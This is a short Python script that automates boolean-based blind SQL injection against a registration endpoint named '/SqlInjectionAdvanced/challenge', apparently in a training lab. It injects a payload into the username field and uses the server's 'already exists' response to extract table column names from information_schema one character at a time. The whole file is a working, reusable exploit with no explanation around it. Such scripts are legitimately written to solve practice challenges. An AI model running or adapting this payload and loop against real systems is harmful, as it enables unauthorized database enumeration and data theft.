import json
import requests

def find_columns_for_table(cookie, server_url, table_name):
    """
    Finds all column names for a specific table.
    
    Args:
        cookie (str): Session cookie for authentication.
        server_url (str): The URL of the server to target.
        table_name (str): The table to inspect.

    Returns:
        list: A list of column names for the table.
    """
    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'
    headers = {
        'Cookie': cookie,
    }

    def check_column_exists(starting_char, column_index, column_number):
        payload = "' OR (SELECT substring(column_name, {}, 1) FROM information_schema.columns WHERE table_name = '{}' LIMIT 1 OFFSET {}) = '{}' --".format(
            column_index, table_name, column_number, starting_char
        )
        data = {
            'username_reg': payload,
            'email_reg': 'a@a',
            'password_reg': 'a',
            'confirm_password_reg': 'a'
        }
        r = requests.put(f'{server_url}/SqlInjectionAdvanced/challenge', headers=headers, data=data)

        try:
            response = json.loads(r.text)
        except:
            print("Server error or invalid response.")
            return False

        return "already exists" in response.get('feedback', '')

    columns = []
    column_number = 0

    while True:
        column_name = ''
        column_index = 1

        while True:
            char_found = False
            for char in alphabet:
                if check_column_exists(char, column_index, column_number):
                    column_name += char
                    column_index += 1
                    char_found = True
                    break

            if not char_found:
                break

        if column_name:
            columns.append(column_name)
            column_number += 1
        else:
            break

    return columns
